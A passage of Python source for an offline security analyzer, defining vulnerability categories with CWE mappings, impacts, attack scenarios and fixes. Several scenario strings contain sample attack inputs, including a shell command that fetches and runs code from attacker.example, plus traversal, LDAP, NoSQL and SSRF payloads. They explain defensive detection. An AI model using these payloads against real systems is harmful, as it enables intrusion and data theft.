#!/usr/bin/env python3
"""Built-in analyzers (audit stage 3a): offline, zero-install detection.

These analyzers are the guaranteed floor of the audit. They need no network and
no third-party package, so a scan never degrades to "no tools, no findings".
External scanners raise coverage; they are not a prerequisite.

How detection works
-------------------
Every rule is a regular expression with a *sink* shape, a category, a CWE and a
fix. Three refinements keep the output usable rather than noisy:

* **Sources.** Rules marked ``needs_source`` only fire when a request-derived
  value is visible on the matched line, or when the variable passed to the sink
  was assigned from a request object earlier in the same file. A concatenation
  of two constants is not an injection.
* **Guards.** Each category lists the compensating controls that would make the
  pattern safe (a bound-parameter call, an HTML escaper, an allow-list, a
  canonicalisation call). A guard on the matched line *suppresses* the finding
  and the suppression is recorded with its reason, so a clean file is visibly
  checked rather than silently skipped.
* **Confidence, not certainty.** These are heuristics. Everything is emitted
  ``validation_status: "unvalidated"`` and unscored; stage 5 confirms or
  suppresses each one against the real code. Severity here is the rule's
  ceiling, not a measured CVSS band.

Secrets are redacted at ingestion: the raw value is never written to the
findings file, only a prefix and the true length, which is enough to locate and
rotate the value and not enough to use it.

Documents are scanned for credentials
-------------------------------------
A token committed to ``README.md``, ``docs/``, ``CHANGELOG``, an ``.ipynb`` or a
plain-text note is as usable as one in a module, and those files are copied,
mirrored and often published, so the secret pass runs over the documentation and
text buckets as well as over code. Prose is *only* read by that pass: the
injection heuristics are never run on it, so a SQL snippet in a tutorial does not
become a finding. Two further rules keep documentation quiet enough to trust:
a doc line that reads like an illustration is skipped, and the two ambiguous
secret shapes (a generic ``password = "..."`` assignment and a connection
string) are reported at MEDIUM confidence there rather than HIGH.

Read-only, deterministic, standard library only.

Usage
-----
    python3 scripts/builtin_analyzers.py --root . --out findings.json
    python3 scripts/builtin_analyzers.py --inventory inventory.json \\
        --technologies technologies.json --attack-surface attack-surface.json
    python3 scripts/builtin_analyzers.py --list-rules
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, Iterator, List, Optional, Sequence, Set, Tuple

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import finding_model as fm  # noqa: E402  (local sibling module)
import repository_inventory as inv  # noqa: E402

TOOL_NAME = "builtin_analyzers.py"
TOOL_VERSION = "1.0.0"

MAX_EVIDENCE_CHARS = 1200
MAX_EVIDENCE_LINES = 5


# --------------------------------------------------------------------------- #
# Category metadata
# --------------------------------------------------------------------------- #
#: Everything a finding needs that is true of the *class*, not of one match.
#: ``api`` is the OWASP API Security Top 10:2023 mapping; ``None`` means the
#: class is not an API-surface concern and is reported as "not mapped".
CATEGORY_META: Dict[str, Dict[str, Any]] = {
    "sql_injection": {
        "cwe": "CWE-89",
        "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command",
        "owasp": "A05:2025", "api": "API1:2023", "severity": "High",
        "description": "A SQL statement is assembled from strings that include data the caller "
                       "controls, so the database parses attacker-chosen syntax instead of a value.",
        "impact": "Disclosure or modification of arbitrary rows, authentication bypass, and "
                  "file-system or command execution where the database supports it.",
        "scenario": "An attacker supplies a quote plus a boolean or UNION payload in the parameter "
                    "that is concatenated into the statement, changing the query the server runs.",
        "fix": "Bind every value (placeholders plus a parameters argument). Identifiers that cannot "
               "be bound, such as a sort column or table name, must come from a server-side "
               "allow-list.",
        "references": ["https://cwe.mitre.org/data/definitions/89.html",
                       "https://owasp.org/Top10/2025/A05_2025-Injection/"],
    },
    "nosql_injection": {
        "cwe": "CWE-943",
        "cwe_name": "Improper Neutralization of Special Elements in Data Query Logic",
        "owasp": "A05:2025", "api": "API1:2023", "severity": "High",
        "description": "A request object or request-derived string reaches a document query, so "
                       "query operators can be injected instead of plain values.",
        "impact": "Authentication bypass (an operator such as $ne matches any password), access to "
                  "other tenants' documents, and server-side JavaScript execution via $where.",
        "scenario": "An attacker posts {\"password\": {\"$ne\": null}} where the code expects a "
                    "string, and the query matches the first user instead of checking a password.",
        "fix": "Coerce and type-check every value before it reaches the query, reject keys that "
               "start with $, and build filters with the driver's typed helpers.",
        "references": ["https://cwe.mitre.org/data/definitions/943.html",
                       "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
    },
    "command_injection": {
        "cwe": "CWE-78",
        "cwe_name": "Improper Neutralization of Special Elements used in an OS Command",
        "owasp": "A05:2025", "api": None, "severity": "Critical",
        "description": "A shell is invoked with a command string that includes caller-controlled "
                       "data, so the shell interprets part of the data as syntax.",
        "impact": "Arbitrary command execution as the application user: data theft, lateral "
                  "movement, persistence, and full host compromise in most deployments.",
        "scenario": "An attacker appends '; curl attacker.example/s | sh' to a filename or host "
                    "parameter that is interpolated into a shell command.",
        "fix": "Call the program directly with an argument list and no shell; validate any value "
               "that must reach the command line against a strict allow-list.",
        "references": ["https://cwe.mitre.org/data/definitions/78.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"],
    },
    "code_injection": {
        "cwe": "CWE-94",
        "cwe_name": "Improper Control of Generation of Code",
        "owasp": "A05:2025", "api": None, "severity": "Critical",
        "description": "Caller-controlled data is evaluated as code by the language runtime.",
        "impact": "Arbitrary code execution in the application process with its privileges and "
                  "secrets.",
        "scenario": "An attacker supplies 'return 1' or a full function body to a parameter that "
                    "is passed to eval(), gaining execution under the server's identity.",
        "fix": "Remove dynamic evaluation. Use a lookup table of permitted operations, or a "
               "sandboxed expression evaluator that cannot reach the host language.",
        "references": ["https://cwe.mitre.org/data/definitions/94.html"],
    },
    "ssti": {
        "cwe": "CWE-1336",
        "cwe_name": "Improper Neutralization of Special Elements Used in a Template Engine",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "Caller-controlled data is compiled as a template rather than rendered as "
                       "template *data*.",
        "impact": "Server-side code execution in most template engines (Jinja2, Twig, Freemarker, "
                  "Handlebars with helpers), plus file read and secret disclosure.",
        "scenario": "An attacker submits '{{7*7}}' and then engine-specific object-traversal "
                    "payloads to reach configuration and execute commands.",
        "fix": "Render templates that exist on disk and pass user input only as context values. "
               "Never build a template from request data.",
        "references": ["https://cwe.mitre.org/data/definitions/1336.html",
                       "https://portswigger.net/web-security/server-side-template-injection"],
    },
    "ldap_injection": {
        "cwe": "CWE-90",
        "cwe_name": "Improper Neutralization of Special Elements used in an LDAP Query",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "An LDAP filter is built by string composition, so filter metacharacters in "
                       "the input change the query.",
        "impact": "Authentication bypass against directory-backed logins and disclosure of "
                  "directory entries.",
        "scenario": "An attacker sends '*)(uid=*))(|(uid=*' as the username so the filter matches "
                    "the first entry regardless of password.",
        "fix": "Escape filter values with the library's escaper and bind the filter as a parameter; "
               "use a dedicated service account with minimal read scope.",
        "references": ["https://cwe.mitre.org/data/definitions/90.html"],
    },
    "xpath_injection": {
        "cwe": "CWE-643",
        "cwe_name": "Improper Neutralization of Data within XPath Expressions",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "An XPath expression is assembled from input, so predicates can be altered.",
        "impact": "Authentication bypass and disclosure of the whole XML document.",
        "scenario": "An attacker supplies \"' or '1'='1\" as a username so the XPath predicate is "
                    "always true.",
        "fix": "Use parameterised XPath (variables) or an allow-list; escape quotes per the XPath "
               "specification.",
        "references": ["https://cwe.mitre.org/data/definitions/643.html"],
    },
    "header_injection": {
        "cwe": "CWE-113",
        "cwe_name": "Improper Neutralization of CRLF Sequences in HTTP Headers",
        "owasp": "A05:2025", "api": None, "severity": "Medium",
        "description": "A response header value includes caller-controlled data, allowing CR/LF to "
                       "inject additional headers or a response body.",
        "impact": "Header splitting, cache poisoning, cookie injection, and cross-site scripting "
                  "through an injected body.",
        "scenario": "An attacker puts '%0d%0aSet-Cookie: admin=1' in a value that is copied into a "
                    "Location or custom header.",
        "fix": "Strip CR and LF from any value copied into a header and prefer framework APIs that "
               "encode header values.",
        "references": ["https://cwe.mitre.org/data/definitions/113.html"],
    },
    "xss_reflected": {
        "cwe": "CWE-79",
        "cwe_name": "Improper Neutralization of Input During Web Page Generation",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "A response body is generated with request data and without contextual "
                       "output encoding, so the data becomes markup.",
        "impact": "Script execution in a victim's browser under the application origin: session "
                  "theft, action forgery, and credential phishing.",
        "scenario": "An attacker sends a crafted link whose query parameter closes the current "
                    "attribute and adds an event handler that exfiltrates cookies.",
        "fix": "Escape at the point of output with a context-aware auto-escaping template engine, "
               "and set a restrictive Content-Security-Policy as defence in depth.",
        "references": ["https://cwe.mitre.org/data/definitions/79.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"],
    },
    "xss_stored": {
        "cwe": "CWE-79",
        "cwe_name": "Improper Neutralization of Input During Web Page Generation",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "Stored data is rendered as markup, so a payload persists and fires for "
                       "every viewer.",
        "impact": "Persistent script execution affecting other users, including administrators, "
                  "without any further attacker interaction.",
        "scenario": "An attacker stores a payload in a profile or comment field; it executes when "
                    "an administrator opens the moderation view.",
        "fix": "Store raw data and escape on output; explicitly mark safe HTML through a sanitising "
               "library rather than trusting stored content.",
        "references": ["https://cwe.mitre.org/data/definitions/79.html"],
    },
    "path_traversal": {
        "cwe": "CWE-22",
        "cwe_name": "Improper Limitation of a Pathname to a Restricted Directory",
        "owasp": "A01:2025", "api": None, "severity": "High",
        "description": "A caller-controlled value becomes part of a file path without "
                       "canonicalisation against an allowed directory.",
        "impact": "Read or write of arbitrary files: source code, configuration, credentials, and "
                  "sometimes code execution by overwriting templates or cron files.",
        "scenario": "An attacker requests '../../../../etc/passwd' or a private key path where a "
                    "report name is expected.",
        "fix": "Resolve the final path and verify it is inside the intended base directory; map "
               "user input to known filenames instead of building paths from it.",
        "references": ["https://cwe.mitre.org/data/definitions/22.html"],
    },
    "unrestricted_upload": {
        "cwe": "CWE-434",
        "cwe_name": "Unrestricted Upload of File with Dangerous Type",
        "owasp": "A05:2025", "api": None, "severity": "High",
        "description": "An uploaded file is written to disk using a caller-controlled name or type "
                       "without an allow-list.",
        "impact": "Overwrite of application files and, where the upload directory is served or "
                  "executable, remote code execution.",
        "scenario": "An attacker uploads 'shell.php' (or 'shell.phtml') into a web-served folder "
                    "and requests it to run arbitrary code.",
        "fix": "Generate the stored filename, keep an extension allow-list, store outside the web "
               "root, and serve downloads through an authorising handler.",
        "references": ["https://cwe.mitre.org/data/definitions/434.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"],
    },
    "zip_slip": {
        "cwe": "CWE-22",
        "cwe_name": "Improper Limitation of a Pathname to a Restricted Directory",
        "owasp": "A01:2025", "api": None, "severity": "High",
        "description": "An archive is extracted without validating entry names, so entries can "
                       "escape the destination directory.",
        "impact": "Arbitrary file write, which commonly becomes code execution by overwriting a "
                  "startup script or template.",
        "scenario": "An attacker uploads a zip whose entry is named '../../app/views/index.php', "
                    "which overwrites a file the server later executes.",
        "fix": "Reject entries containing '..' or absolute paths, and resolve each destination "
               "against the extraction root before writing.",
        "references": ["https://cwe.mitre.org/data/definitions/22.html"],
    },
    "ssrf": {
        "cwe": "CWE-918",
        "cwe_name": "Server-Side Request Forgery",
        "owasp": "A10:2025", "api": "API7:2023", "severity": "High",
        "description": "The server fetches a URL taken from the request, so the attacker chooses "
                       "which host and scheme are contacted.",
        "impact": "Access to cloud metadata credentials, internal admin services, and scanning of "
                  "hosts that only the server can reach.",
        "scenario": "An attacker sets a webhook or image URL to http://169.254.169.254/ to obtain "
                    "instance credentials.",
        "fix": "Resolve the target and enforce an allow-list of hosts and schemes, block private "
               "and link-local ranges, and disable redirects on the fetch.",
        "references": ["https://cwe.mitre.org/data/definitions/918.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"],
    },
    "open_redirect": {
        "cwe": "CWE-601",
        "cwe_name": "URL Redirection to Untrusted Site",
        "owasp": "A01:2025", "api": None, "severity": "Medium",
        "description": "A redirect target is taken from the request without restricting it to "
                       "local destinations.",
        "impact": "Credible phishing from the trusted application origin and, with token-in-URL "
                  "flows, theft of credentials.",
        "scenario": "An attacker sends a login link with ?next=https://attacker.example and the "
                    "application redirects there after authentication.",
        "fix": "Only redirect to a relative path or to an allow-listed host, and show an interstitial "
               "for anything else.",
        "references": ["https://cwe.mitre.org/data/definitions/601.html"],
    },
    "tls_verification_disabled": {
        "cwe": "CWE-295",
        "cwe_name": "Improper Certificate Validation",
        "owasp": "A04:2025", "api": None, "severity": "High",
        "description": "TLS certificate validation is disabled for an outbound connection.",
        "impact": "Any on-path attacker can impersonate the remote service and read or alter the "
                  "traffic, including credentials and tokens.",
        "scenario": "An attacker on the same network presents a self-signed certificate and the "
                    "client accepts it because verification is off.",
        "fix": "Enable verification and, if a private CA is involved, install that CA explicitly "
               "rather than disabling the check.",
        "references": ["https://cwe.mitre.org/data/definitions/295.html"],
    },
    "missing_authentication": {
        "cwe": "CWE-306",
        "cwe_name": "Missing Authentication for Critical Function",
        "owasp": "A07:2025", "api": "API2:2023", "severity": "High",
        "description": "A route that changes state or exposes sensitive data shows no authentication "
                       "mechanism anywhere in its file or controller scope.",
        "impact": "Unauthenticated access to functionality or data that was intended for signed-in "
                  "users or administrators.",
        "scenario": "An attacker calls the endpoint directly, without a session or token, and the "
                    "handler performs the action.",
        "fix": "Apply the framework's authentication middleware to the route or its controller group, "
               "and add a test that asserts an anonymous request is rejected.",
        "references": ["https://cwe.mitre.org/data/definitions/306.html"],
    },
    "missing_authorization": {
        "cwe": "CWE-862",
        "cwe_name": "Missing Authorization",
        "owasp": "A01:2025", "api": "API5:2023", "severity": "High",
        "description": "An authorization decision is taken from a value the client controls, or "
                       "the check that should guard the operation is absent, disabled or commented "
                       "out.",
        "impact": "Privilege escalation and cross-tenant access: an ordinary account performs "
                  "administrative actions or reads another tenant's records.",
        "scenario": "An attacker adds \"role\": \"admin\" to a profile update, or uncomments a "
                    "disabled guard by finding an unprotected sibling route, and the server honours "
                    "it because it decides permissions from the request.",
        "fix": "Derive roles and permissions from server-side state keyed by the authenticated "
               "subject, deny by default, and assert the negative case in a test per operation.",
        "references": ["https://cwe.mitre.org/data/definitions/862.html",
                       "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/"],
    },
    "weak_password_hashing": {
        "cwe": "CWE-916",
        "cwe_name": "Use of Password Hash With Insufficient Computational Effort",
        "owasp": "A04:2025", "api": None, "severity": "High",
        "description": "Passwords are hashed with a fast, unsalted or obsolete algorithm, or "
                       "compared without a constant-time function.",
        "impact": "After a database leak, passwords are recovered quickly and reused on other "
                  "services.",
        "scenario": "An attacker cracks MD5 or single-round SHA-1 hashes offline at billions of "
                    "candidates per second.",
        "fix": "Use Argon2id, scrypt or bcrypt with a per-user salt and a tuned cost, and compare "
               "in constant time.",
        "references": ["https://cwe.mitre.org/data/definitions/916.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"],
    },
    "weak_jwt_validation": {
        "cwe": "CWE-347",
        "cwe_name": "Improper Verification of Cryptographic Signature",
        "owasp": "A07:2025", "api": "API2:2023", "severity": "Critical",
        "description": "A JSON Web Token is decoded without verifying its signature, or the "
                       "algorithm is taken from the token ('none', or HS/RS confusion).",
        "impact": "An attacker forges a token with arbitrary claims (for example an administrator "
                  "subject) and is authenticated as that identity.",
        "scenario": "An attacker sets 'alg' to 'none' or signs with the public key as an HMAC "
                    "secret, and the library accepts the token.",
        "fix": "Always verify with an explicit algorithm allow-list and a key of the matching type; "
               "never accept 'none'; validate issuer, audience and expiry.",
        "references": ["https://cwe.mitre.org/data/definitions/347.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"],
    },
    "session_management": {
        "cwe": "CWE-614",
        "cwe_name": "Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
        "owasp": "A07:2025", "api": None, "severity": "Medium",
        "description": "Session cookie attributes or the session secret are configured insecurely.",
        "impact": "Session theft over plaintext channels, script access to the cookie, or forged "
                  "sessions when the signing secret is a literal.",
        "scenario": "An attacker reads the cookie through an XSS bug because HttpOnly is disabled, "
                    "or replays it over HTTP because Secure is missing.",
        "fix": "Set Secure, HttpOnly and SameSite on session cookies, rotate the secret from a "
               "managed store, and regenerate the session on login.",
        "references": ["https://cwe.mitre.org/data/definitions/614.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"],
    },
    "idor": {
        "cwe": "CWE-639",
        "cwe_name": "Authorization Bypass Through User-Controlled Key",
        "owasp": "A01:2025", "api": "API1:2023", "severity": "High",
        "description": "An object is fetched by an identifier taken from the request without an "
                       "ownership or tenant constraint.",
        "impact": "Any authenticated user can read or modify other users' records by changing the "
                  "identifier (BOLA).",
        "scenario": "An attacker replaces /api/invoices/1001 with /api/invoices/1002 and receives "
                    "another customer's invoice.",
        "fix": "Scope the query by the authenticated subject (or tenant) rather than filtering "
               "afterwards, and assert ownership in one reusable authorisation layer.",
        "references": ["https://cwe.mitre.org/data/definitions/639.html",
                       "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"],
    },
    "missing_function_level_authorization": {
        "cwe": "CWE-863",
        "cwe_name": "Incorrect Authorization",
        "owasp": "A01:2025", "api": "API5:2023", "severity": "High",
        "description": "An administrative or privileged operation is exposed without a role or "
                       "permission check.",
        "impact": "Privilege escalation: a normal user performs administrative actions.",
        "scenario": "An attacker discovers /admin/users/delete and calls it with an ordinary "
                    "account because only authentication, not authorisation, is enforced.",
        "fix": "Enforce a server-side role check per operation (deny by default) and cover it with "
               "a negative test per endpoint.",
        "references": ["https://cwe.mitre.org/data/definitions/863.html",
                       "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/"],
    },
    "csrf": {
        "cwe": "CWE-352",
        "cwe_name": "Cross-Site Request Forgery",
        "owasp": "A01:2025", "api": None, "severity": "Medium",
        "description": "CSRF protection is explicitly disabled, or state-changing routes are "
                       "reachable with cookie authentication and no token.",
        "impact": "An attacker's site causes a signed-in victim's browser to perform actions the "
                  "victim did not intend.",
        "scenario": "A hidden form on attacker.example posts to /account/email and changes the "
                    "victim's address so the attacker can reset the password.",
        "fix": "Keep framework CSRF protection enabled for cookie-authenticated state changes, and "
               "use SameSite=Lax or Strict cookies.",
        "references": ["https://cwe.mitre.org/data/definitions/352.html"],
    },
    "business_logic": {
        "cwe": "CWE-840",
        "cwe_name": "Business Logic Errors",
        "owasp": "A06:2025", "api": "API6:2023", "severity": "High",
        "description": "A security-relevant value (price, quantity, role, discount) is taken from "
                       "the request and trusted by the business rule.",
        "impact": "Financial loss, privilege escalation, or free access to paid features, often "
                  "without leaving a trace in logs.",
        "scenario": "An attacker posts a negative quantity or a client-set price and the server "
                    "accepts it, crediting the account.",
        "fix": "Derive prices, totals and roles on the server from authoritative data; treat client "
               "values as untrusted input and re-validate the invariants at the point of use.",
        "references": ["https://cwe.mitre.org/data/definitions/840.html"],
    },
    "missing_rate_limiting": {
        "cwe": "CWE-770",
        "cwe_name": "Allocation of Resources Without Limits or Throttling",
        "owasp": "A06:2025", "api": "API4:2023", "severity": "Medium",
        "description": "A credential or expensive endpoint has no visible rate limit or lockout.",
        "impact": "Online password guessing, OTP brute force, resource exhaustion and cost abuse.",
        "scenario": "An attacker submits millions of password attempts against /login because "
                    "nothing limits the rate.",
        "fix": "Apply per-account and per-IP rate limits with backoff and alerting on repeated "
               "failures; make the limit independent of the client-supplied identifier.",
        "references": ["https://cwe.mitre.org/data/definitions/770.html"],
    },
    "race_condition": {
        "cwe": "CWE-362",
        "cwe_name": "Concurrent Execution Using Shared Resource with Improper Synchronization",
        "owasp": "A06:2025", "api": None, "severity": "Medium",
        "description": "A check on a shared value is followed by a separate write, leaving a "
                       "window between them.",
        "impact": "Double spending, duplicate redemptions and limit bypass by issuing parallel "
                  "requests.",
        "scenario": "An attacker sends two simultaneous withdrawal requests; both read the same "
                    "balance and both succeed.",
        "fix": "Make the check atomic (conditional UPDATE, SELECT ... FOR UPDATE, or a unique "
               "constraint) and reject the loser explicitly.",
        "references": ["https://cwe.mitre.org/data/definitions/362.html"],
    },
    "mass_assignment": {
        "cwe": "CWE-915",
        "cwe_name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes",
        "owasp": "A01:2025", "api": "API3:2023", "severity": "High",
        "description": "A request body is applied directly to a model or object, so fields the "
                       "client should not control are writable.",
        "impact": "Privilege escalation by setting 'is_admin', 'role' or 'balance' in a profile "
                  "update.",
        "scenario": "An attacker adds \"role\": \"admin\" to a profile update payload and the "
                    "serialiser copies it onto the record.",
        "fix": "Use an explicit allow-list of writable fields (DTO or serialiser field list) and "
               "never bind a request body straight onto a persistent model.",
        "references": ["https://cwe.mitre.org/data/definitions/915.html",
                       "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"],
    },
    "weak_randomness": {
        "cwe": "CWE-338",
        "cwe_name": "Use of Cryptographically Weak Pseudo-Random Number Generator",
        "owasp": "A04:2025", "api": None, "severity": "High",
        "description": "A security token is generated with a non-cryptographic PRNG.",
        "impact": "Predictable session, reset or OTP values, allowing account takeover.",
        "scenario": "An attacker observes a few reset tokens from Math.random or Python's random "
                    "and predicts the next one.",
        "fix": "Use a CSPRNG: secrets.token_urlsafe, crypto.randomBytes / crypto.randomUUID, "
               "java.security.SecureRandom or Go's crypto/rand.",
        "references": ["https://cwe.mitre.org/data/definitions/338.html"],
    },
    "hardcoded_secret": {
        "cwe": "CWE-798",
        "cwe_name": "Use of Hard-coded Credentials",
        "owasp": "A04:2025", "api": None, "severity": "High",
        "description": "A credential, API key or private key is committed in source, configuration or "
                       "documentation.",
        "impact": "Direct access to the third-party or internal service the secret protects, for "
                  "anyone who can read the repository or an image built from it.",
        "scenario": "An attacker reads a frontend bundle or repository mirror and uses the embedded "
                    "cloud key to access production storage.",
        "fix": "Rotate the exposed credential, move it to a secret manager injected at runtime, and "
               "add the pattern to pre-commit secret scanning.",
        "references": ["https://cwe.mitre.org/data/definitions/798.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"],
    },
    "broken_crypto": {
        "cwe": "CWE-327",
        "cwe_name": "Use of a Broken or Risky Cryptographic Algorithm",
        "owasp": "A04:2025", "api": None, "severity": "High",
        "description": "An obsolete cipher, a static IV, or a mode such as ECB is used for "
                       "confidentiality.",
        "impact": "Recovery of plaintext from ciphertext, pattern disclosure, and forged integrity "
                  "where no MAC is used.",
        "scenario": "An attacker observes repeated 16-byte blocks in ECB mode and recovers "
                    "structured data such as session identifiers.",
        "fix": "Use AES-GCM (or ChaCha20-Poly1305) with a random 96-bit nonce per message, keys from "
               "a KMS or secret manager, and authenticated encryption only.",
        "references": ["https://cwe.mitre.org/data/definitions/327.html"],
    },
    "sensitive_data_exposure": {
        "cwe": "CWE-532",
        "cwe_name": "Insertion of Sensitive Information into Log File",
        "owasp": "A04:2025", "api": None, "severity": "Medium",
        "description": "Credentials or tokens are written to logs or to the console.",
        "impact": "Anyone with log access (support staff, log pipeline, third-party APM) obtains "
                  "reusable credentials.",
        "scenario": "An attacker with read access to the logging platform finds a debug line that "
                    "printed a password reset token.",
        "fix": "Never log secrets; log identifiers instead, and add a redaction filter to the "
               "logging configuration.",
        "references": ["https://cwe.mitre.org/data/definitions/532.html"],
    },
    "insecure_deserialization": {
        "cwe": "CWE-502",
        "cwe_name": "Deserialization of Untrusted Data",
        "owasp": "A08:2025", "api": None, "severity": "Critical",
        "description": "Data from outside the process is deserialised with a format that can "
                       "construct arbitrary objects or execute code.",
        "impact": "Remote code execution, or denial of service through object graphs, from a single "
                  "crafted payload.",
        "scenario": "An attacker posts a pickle or serialized Java object whose readObject or "
                    "reduce method runs commands.",
        "fix": "Deserialise only untrusted-neutral formats (JSON with a schema) and, where a native "
               "format is unavoidable, use an allow-list of classes and signed payloads.",
        "references": ["https://cwe.mitre.org/data/definitions/502.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"],
    },
    "unsigned_update": {
        "cwe": "CWE-345",
        "cwe_name": "Insufficient Verification of Data Authenticity",
        "owasp": "A08:2025", "api": None, "severity": "High",
        "description": "An inbound webhook or update payload is accepted without verifying its "
                       "signature.",
        "impact": "Forged events: fake payments, unauthorised provisioning, and injected commands "
                  "from an unauthenticated source.",
        "scenario": "An attacker posts a fake payment-succeeded event to the webhook endpoint and "
                    "the system credits an order.",
        "fix": "Verify an HMAC signature over the raw body with a constant-time comparison and "
               "reject stale timestamps.",
        "references": ["https://cwe.mitre.org/data/definitions/345.html"],
    },
    "vulnerable_dependency": {
        "cwe": "CWE-1104",
        "cwe_name": "Use of Unmaintained Third Party Components",
        "owasp": "A03:2025", "api": None, "severity": "High",
        "description": "A declared dependency version falls in a range with a published, "
                       "high-severity vulnerability.",
        "impact": "Depends on the advisory: remote code execution, deserialisation, or denial of "
                  "service through the library's public API.",
        "scenario": "An attacker reaches the vulnerable code path through the application's normal "
                    "use of the library.",
        "fix": "Upgrade to the fixed version, or pin and document a compensating control until the "
               "upgrade is possible.",
        "references": ["https://cwe.mitre.org/data/definitions/1104.html",
                       "https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/"],
    },
    "unpinned_dependency": {
        "cwe": "CWE-829",
        "cwe_name": "Inclusion of Functionality from Untrusted Control Sphere",
        "owasp": "A03:2025", "api": None, "severity": "Low",
        "description": "A dependency is declared without a version constraint or with a floating "
                       "range, so builds are not reproducible.",
        "impact": "A compromised or broken upstream release enters production without review, and "
                  "two builds of the same commit can differ.",
        "scenario": "An attacker publishes a malicious patch version of a dependency that the build "
                    "resolves automatically.",
        "fix": "Pin exact versions and commit the lockfile; update through a reviewed dependency "
               "bot.",
        "references": ["https://cwe.mitre.org/data/definitions/829.html"],
    },
    "permissive_cors": {
        "cwe": "CWE-942",
        "cwe_name": "Permissive Cross-domain Policy with Untrusted Domains",
        "owasp": "A02:2025", "api": "API8:2023", "severity": "Medium",
        "description": "Cross-origin access is allowed for any origin, or the request origin is "
                       "reflected, together with credentials.",
        "impact": "Any website can read authenticated responses from the API on behalf of a signed-in "
                  "user.",
        "scenario": "An attacker's page issues a credentialed fetch to the API, which reflects the "
                    "attacker origin and returns the victim's data.",
        "fix": "Allow-list exact origins, never combine a wildcard or reflection with credentials, "
               "and validate Origin on state-changing requests.",
        "references": ["https://cwe.mitre.org/data/definitions/942.html"],
    },
    "missing_security_headers": {
        "cwe": "CWE-693",
        "cwe_name": "Protection Mechanism Failure",
        "owasp": "A02:2025", "api": None, "severity": "Low",
        "description": "Security headers or the middleware that sets them are explicitly disabled.",
        "impact": "Removes browser-side defences: framing, MIME sniffing, referrer leakage and "
                  "script-src restrictions.",
        "scenario": "An attacker frames the application to overlay a login form (clickjacking), or "
                    "exploits the missing CSP to make stored XSS easier.",
        "fix": "Enable the framework's header middleware and set CSP, HSTS, X-Content-Type-Options, "
               "Referrer-Policy and frame-ancestors explicitly.",
        "references": ["https://cwe.mitre.org/data/definitions/693.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"],
    },
    "debug_mode": {
        "cwe": "CWE-489",
        "cwe_name": "Active Debug Code",
        "owasp": "A02:2025", "api": "API8:2023", "severity": "Medium",
        "description": "A debug or development mode is enabled in code that can be deployed.",
        "impact": "Stack traces and interactive debuggers disclose secrets and, for Werkzeug or "
                  "similar consoles, allow code execution.",
        "scenario": "An attacker triggers an exception and uses the interactive traceback to run "
                    "Python in the server process.",
        "fix": "Drive debug mode from an environment flag that is false by default, and return "
               "generic errors with a correlation id.",
        "references": ["https://cwe.mitre.org/data/definitions/489.html"],
    },
    "container_security": {
        "cwe": "CWE-250",
        "cwe_name": "Execution with Unnecessary Privileges",
        "owasp": "A02:2025", "api": None, "severity": "Medium",
        "description": "The container image runs as root, uses a mutable base image, or adds "
                       "privileges it does not need.",
        "impact": "Container escape or host compromise becomes materially easier, and builds are "
                  "not reproducible.",
        "scenario": "An attacker who gains code execution in the container is already root and can "
                    "attack mounted volumes and the runtime socket.",
        "fix": "Create an unprivileged user, set USER in the Dockerfile, pin the base image by "
               "digest, and drop capabilities.",
        "references": ["https://cwe.mitre.org/data/definitions/250.html",
                       "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"],
    },
    "kubernetes_security": {
        "cwe": "CWE-250",
        "cwe_name": "Execution with Unnecessary Privileges",
        "owasp": "A02:2025", "api": None, "severity": "High",
        "description": "A workload is admitted with privileged, host-level or root access.",
        "impact": "Container breakout to the node: access to host file systems, other pods' "
                  "credentials and the container runtime.",
        "scenario": "An attacker exploits the application and, because the pod is privileged with a "
                    "hostPath mount, writes to the node's filesystem.",
        "fix": "Set privileged false, runAsNonRoot true, drop ALL capabilities, forbid hostPath and "
               "host namespaces, and enforce with Pod Security Standards.",
        "references": ["https://cwe.mitre.org/data/definitions/250.html",
                       "https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
    },
    "iac_misconfiguration": {
        "cwe": "CWE-1188",
        "cwe_name": "Initialization of a Resource with an Insecure Default",
        "owasp": "A02:2025", "api": None, "severity": "High",
        "description": "Infrastructure as code publishes a resource publicly, disables encryption, "
                       "or opens a management port to the internet.",
        "impact": "Direct internet exposure of storage or databases, including bulk data theft.",
        "scenario": "An attacker enumerates a public bucket or connects to a database whose security "
                    "group allows 0.0.0.0/0.",
